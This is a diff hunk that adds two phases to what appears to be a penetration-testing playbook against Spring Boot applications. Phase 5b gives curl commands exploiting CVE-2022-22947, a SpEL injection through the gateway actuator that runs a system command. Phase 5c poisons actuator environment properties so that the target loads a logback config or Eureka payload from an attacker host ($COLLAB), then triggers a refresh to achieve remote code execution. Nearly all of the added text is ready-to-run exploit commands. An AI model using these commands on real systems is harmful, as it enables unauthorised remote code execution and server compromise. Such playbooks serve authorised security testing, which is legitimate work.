@@ -155,6 +155,25 @@ curl -s -X POST "https://$TARGET/functionRouter" \
 
 ---
 
+## Phase 5b — Spring Cloud Gateway Actuator SpEL RCE (CVE-2022-22947)
+If the `gateway` actuator is exposed, add a route whose filter body is SpEL, then refresh to evaluate it (escape inner quotes for your shell):
+```bash
+curl -s -X POST "$BASE/actuator/gateway/routes/hax" -H "Content-Type: application/json" \
+ -d '{"id":"hax","filters":[{"name":"AddResponseHeader","args":{"name":"X","value":"#{T(java.lang.Runtime).getRuntime().exec(new String[]{ \"id\" })}"}}],"uri":"http://x"}'
+curl -s -X POST "$BASE/actuator/gateway/refresh"; curl -s "$BASE/actuator/gateway/routes"
+```
+
+## Phase 5c — Writable `/env` -> `/refresh` gadget RCE
+When `/actuator/env` accepts POST and `/actuator/refresh` exists, poison a property then reload:
+```bash
+# logback JNDI:
+curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"logging.config","value":"http://$COLLAB/logback.xml"}'
+# Eureka XStream deserialization:
+curl -s -X POST "$BASE/actuator/env" -H "Content-Type: application/json" -d '{"name":"eureka.client.serviceUrl.defaultZone","value":"http://$COLLAB/x"}'
+curl -s -X POST "$BASE/actuator/refresh"
+```
+(Veracode: Exploiting Spring Boot Actuators.)
+
 ## Phase 6 — Spring4Shell (CVE-2022-22965)
 
 ```bash
